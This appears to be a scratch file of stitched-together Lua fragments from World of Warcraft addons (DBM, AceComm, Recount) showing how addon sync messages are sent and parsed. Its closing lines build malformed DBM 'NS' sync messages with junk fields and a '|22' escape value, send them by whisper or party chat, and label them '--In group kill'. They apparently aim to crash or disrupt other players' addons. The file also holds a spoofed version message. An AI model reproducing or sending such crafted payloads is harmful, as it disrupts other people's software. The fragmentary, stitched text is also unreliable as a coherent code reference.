sendSync("V", ("%d\t%s\t%s\t%s\t%s"):format(DBM.Revision, tostring(DBM.ReleaseRevision), DBM.DisplayVersion, GetLocale(), tostring(not DBM.Options.DontSetIcons)))

displayVersion


local function sendSync(prefix, msg)
	msg = msg or ""
	if IsInGroup(LE_PARTY_CATEGORY_INSTANCE) and IsInInstance() and not C_Garrison:IsOnGarrisonMap() then--For BGs, LFR and LFG (we also check IsInInstance() so if you're in queue but fighting something outside like a world boss, it'll sync in "RAID" instead)
		SendAddonMessage("D4", prefix .. "\t" .. msg, "INSTANCE_CHAT")
	else
		if IsInRaid() then
			SendAddonMessage("D4", prefix .. "\t" .. msg, "RAID")
		elseif IsInGroup(LE_PARTY_CATEGORY_HOME) then
			SendAddonMessage("D4", prefix .. "\t" .. msg, "PARTY")
		else--for solo raid
			SendAddonMessage("D4", prefix .. "\t" .. msg, "WHISPER", playerName)
		end
	end
end

SendAddonMessage("D4", "V" .. "\t" .. ("%d\t%s\t%s\t%s\t%s"):format(DBM.Revision, tostring(DBM.ReleaseRevision), DBM.DisplayVersion, GetLocale(), tostring(not DBM.Options.DontSetIcons)), "WHISPER", "ocd")


	Revision = tonumber(("$Revision: 15307 $"):sub(12, -3)),
	DisplayVersion = "7.0.11", -- the string that is shown as version
	ReleaseRevision = 15307 -- the revision of the latest stable version that is available



function AceComm:SendCommMessage(prefix, text, distribution, target, prio, callbackFn, callbackArg)
	prio = prio or "NORMAL"	-- pasta's reference implementation had different prio for singlepart and multipart, but that's a very bad idea since that can easily lead to out-of-sequence delivery!
	if not( type(prefix)=="string" and
			type(text)=="string" and
			type(distribution)=="string" and
			(target==nil or type(target)=="string") and
			(prio=="BULK" or prio=="NORMAL" or prio=="ALERT") 
		) then
		error('Usage: SendCommMessage(addon, "prefix", "text", "distribution"[, "target"[, "prio"[, callbackFn, callbackarg]]])', 2)
	end

	local textlen = #text
	local maxtextlen = 255  -- Yes, the max is 255 even if the dev post said 256. I tested. Char 256+ get silently truncated. /Mikk, 20110327
	local queueName = prefix..distribution..(target or "")

	local ctlCallback = nil
	if callbackFn then
		ctlCallback = function(sent)
			return callbackFn(callbackArg, sent, textlen)
		end
	end
	
	local forceMultipart
	if match(text, "^[\001-\009]") then -- 4.1+: see if the first character is a control character
		-- we need to escape the first character with a \004
		if textlen+1 > maxtextlen then	-- would we go over the size limit?
			forceMultipart = true	-- just make it multipart, no escape problems then
		else
			text = "\004" .. text
		end
	end

	if not forceMultipart and textlen <= maxtextlen then
		-- fits all in one message
		CTL:SendAddonMessage(prio, prefix, text, distribution, target, queueName, ctlCallback, textlen)
	else
		maxtextlen = maxtextlen - 1	-- 1 extra byte for part indicator in prefix(4.0)/start of message(4.1)

		-- first part
		local chunk = strsub(text, 1, maxtextlen)
		CTL:SendAddonMessage(prio, prefix, MSG_MULTI_FIRST..chunk, distribution, target, queueName, ctlCallback, maxtextlen)

		-- continuation
		local pos = 1+maxtextlen

		while pos+maxtextlen <= textlen do
			chunk = strsub(text, pos, pos+maxtextlen-1)
			CTL:SendAddonMessage(prio, prefix, MSG_MULTI_NEXT..chunk, distribution, target, queueName, ctlCallback, pos+maxtextlen-1)
			pos = pos + maxtextlen
		end

		-- final part
		chunk = strsub(text, pos)
		CTL:SendAddonMessage(prio, prefix, MSG_MULTI_LAST..chunk, distribution, target, queueName, ctlCallback, textlen)
	end
end




Recount:SendCommMessage("RECOUNT", Recount:Serialize("VQ", Recount.PlayerName, Recount.Version), "PARTY")



			elseif cmd == "PS" then -- Player data set (when first meeting up)
				--Recount:DPrint(cmd .." "..owner.." "..name.." "..(syncin["Damage"] or "nil").." "..(syncin["DamageTaken"] or "nil").." "..(syncin["Healing"] or "nil").." "..(syncin["OverHealing"] or "nil").." "..(syncin["HealingTaken"] or "nil").." "..(syncin["ActiveTime"] or "nil"))
				if type(name) ~= "number" and (not Recount.VerNum[owner] or Recount.VerNum[owner] >= MinimumV) then
					local combatant = dbCombatants[name]
					if not combatant then
						local nameFlags
						local petowner = name:match("<(.-)>")
						if owner == name or not petowner then
							nameFlags = PARTY_GUARDIAN_OWNER_FLAGS
						else
							nameFlags = PARTY_PET_FLAGS
						end
						--Recount:DPrint("Creating combatant from PS: "..name.." "..(petowner or "nil"))
						Recount:AddCombatant(name, petowner and owner, nil, nameFlags, nil) -- This could be bad.
						combatant = dbCombatants[name]
					end


syncHandlers["NS"] = function(sender, modid, modvar, text, abilityName)

local msg = modid.."\t"..modvar.."\t"..syncText.."\t"..abilityName
SendAddonMessage("D4", "NS\t" .. msg, "RAID")

local msg = modid.."\t".."modvar".."\t".."".."\t".."|22"
SendAddonMessage("D4", "NS\t" .. msg, "WHISPER", "ocd")

-- automatically sends an addon message to the appropriate channel (INSTANCE_CHAT, RAID or PARTY)
local function sendSync(prefix, msg)

--In group kill
local msg = "sdfs".."\t".."sdfs".."\t".."sdf".."\t".."|22";
SendAddonMessage("D4", "NS\t" .. msg, "PARTY")